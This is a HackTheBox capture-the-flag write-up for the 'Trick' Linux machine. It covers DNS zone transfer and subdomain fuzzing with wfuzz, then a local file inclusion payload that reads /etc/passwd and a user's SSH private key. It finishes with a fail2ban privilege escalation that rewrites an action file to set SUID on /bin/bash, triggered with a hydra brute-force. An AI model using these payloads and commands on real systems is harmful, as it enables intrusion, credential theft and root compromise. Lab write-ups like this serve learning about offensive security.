hello guys this is my first writeup on hackthebox trick machine,i hope you like it so lets start, its a linux box with ip 10.10.11.166, I added it to /etc/hosts as trick.htb ,Lets jump right in !

Nmap
                                                                                                    
as always we will start with nmap to scan for open ports and services:


        
                                                                                                                     
there are four open ports 22,25,53,80, first i enumerate port 25 smtp
but i found nothing, after that let go for port 53 and webenumerate on port 80


on this above webpage there is nothing to enumerate its a rabbit hole now we 53 port lets fuck this port, i tried to check dns with axfr protocol that is used for zone transfer for replication of DNS data across multiple DNS servers, then i found another subdomain that shown in below image
                                                                                                             
now lets add this subdomain preprod-payroll.trick.htb to /etc/hosts
and enumerat this 

after spend times i realized this subdomain is also a rabbit hole, so
after wastage my time, i remmber that i have also other option that is DNS Bruteforcing for do this i use wfuzz tool and wordlist of seclist
└─$ wfuzz -c -t 200 --hc=400 --hh=5480 -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "host: preprod-FUZZ.trick.htb" http://trick.htb


and boomb i found third subdomain i hope this is not a rabbit hole 
that is preprod-marketing.trick.htb add in /etc/hosts file. I open in browser and tried to do LFI with burp 

http://preprod-marketing.trick.htb/index.php?page=services.html








                                                                                                                
use payload in burp repeater
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd

and found user michael now use second payload 

http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa 

and here i found michael private key


                                                                                                             
now save this key to our home directory and give permission to the key chmod 700 keyname 
now run ssh -i keyname michael@10.10.11.166 for connect to machine 

                                                                                                   
ls
cat user.txt
and here i found user flag 
                                                                                                   
now its time for root flag try to run sudo -l  

here in above image i see a service called fail2ban in running
it is used as IDS & IPS for check let go in depth 
cd /etc/fail2ban/
cat jail.conf
and here in jail.conf sshd enable in fail2ban service 
cd /etc/fail2ban/action.d
for root shell we need  to edit file iptables-multiport.conf
and run the following command 
 
1. sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf

2. rm -f /etc/fail2ban/action.d/iptables-multiport.conf

3. mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf

4. sudo /etc/init.d/fail2ban restart

5. hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.tx (run in parllel terminal in main machine )

6. ls -l /bin/bash

7. bash -p




and we find root flag
